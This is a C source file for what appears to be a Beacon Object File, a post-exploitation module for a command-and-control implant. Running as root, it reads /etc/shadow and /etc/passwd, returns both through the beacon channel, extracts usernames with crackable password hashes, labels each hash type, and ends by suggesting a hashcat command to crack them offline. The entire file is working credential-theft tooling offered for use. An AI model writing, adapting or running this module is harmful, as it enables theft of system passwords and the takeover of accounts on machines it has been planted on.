/// shadow_dump.c — BOF: Dump /etc/shadow + /etc/passwd for offline cracking
/// Compile: gcc -c -o shadow_dump.o shadow_dump.c -include bof_api.h -Os -fPIC
/// Usage: execute bof shadow_dump.o

void go(char *args, int args_len) {
    if (!BeaconIsAdmin()) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Not running as root — cannot read /etc/shadow\n");
        return;
    }

    // Read /etc/shadow
    char *shadow_data = (char *)0;
    int shadow_len = AxReadFileToBuffer("/etc/shadow", &shadow_data, 524288);
    if (shadow_len > 0 && shadow_data) {
        BeaconPrintf(CALLBACK_OUTPUT, "=== /etc/shadow (%d bytes) ===\n", shadow_len);
        BeaconOutput(CALLBACK_OUTPUT, shadow_data, shadow_len);
        BeaconOutput(CALLBACK_OUTPUT, "\n", 1);
        AxFree(shadow_data);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to read /etc/shadow\n");
    }

    // Read /etc/passwd for cross-reference
    char *passwd_data = (char *)0;
    int passwd_len = AxReadFileToBuffer("/etc/passwd", &passwd_data, 524288);
    if (passwd_len > 0 && passwd_data) {
        BeaconPrintf(CALLBACK_OUTPUT, "\n=== /etc/passwd (%d bytes) ===\n", passwd_len);
        BeaconOutput(CALLBACK_OUTPUT, passwd_data, passwd_len);
        AxFree(passwd_data);
    }

    // Parse shadow for accounts with password hashes (not ! or * or empty)
    char *shadow2 = (char *)0;
    int shadow2_len = AxReadFileToBuffer("/etc/shadow", &shadow2, 524288);
    if (shadow2_len > 0 && shadow2) {
        BeaconPrintf(CALLBACK_OUTPUT, "\n=== Accounts with password hashes ===\n");
        int crackable = 0;
        char *line = shadow2;
        while (line < shadow2 + shadow2_len) {
            // Find end of line
            char *eol = line;
            while (eol < shadow2 + shadow2_len && *eol != '\n')
                eol++;

            // Find first colon (end of username)
            char *colon1 = line;
            while (colon1 < eol && *colon1 != ':')
                colon1++;

            if (colon1 < eol) {
                char *hash_start = colon1 + 1;
                // Find second colon (end of hash field)
                char *colon2 = hash_start;
                while (colon2 < eol && *colon2 != ':')
                    colon2++;

                int hash_len = (int)(colon2 - hash_start);
                // Skip locked (!) or disabled (*) or empty accounts
                if (hash_len > 2 && *hash_start != '!' && *hash_start != '*') {
                    // Print username:hash
                    int uname_len = (int)(colon1 - line);
                    char uname[256];
                    if (uname_len > 255) uname_len = 255;
                    AxMemcpy(uname, line, uname_len);
                    uname[uname_len] = '\0';

                    char hash[512];
                    if (hash_len > 511) hash_len = 511;
                    AxMemcpy(hash, hash_start, hash_len);
                    hash[hash_len] = '\0';

                    // Identify hash type
                    const char *htype = "unknown";
                    if (AxStrncmp(hash, "$1$", 3) == 0)  htype = "MD5";
                    if (AxStrncmp(hash, "$5$", 3) == 0)  htype = "SHA-256";
                    if (AxStrncmp(hash, "$6$", 3) == 0)  htype = "SHA-512";
                    if (AxStrncmp(hash, "$y$", 3) == 0)  htype = "yescrypt";
                    if (AxStrncmp(hash, "$2b$", 4) == 0) htype = "bcrypt";
                    if (AxStrncmp(hash, "$2a$", 4) == 0) htype = "bcrypt";

                    BeaconPrintf(CALLBACK_OUTPUT, "  [%s] %s:%s\n", htype, uname, hash);
                    crackable++;
                }
            }

            line = eol + 1;
        }

        if (crackable == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "  (no crackable hashes found)\n");
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "\n[*] %d crackable account(s) found\n", crackable);
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Crack with: hashcat -m 1800 hashes.txt wordlist.txt\n");
        }

        AxFree(shadow2);
    }
}
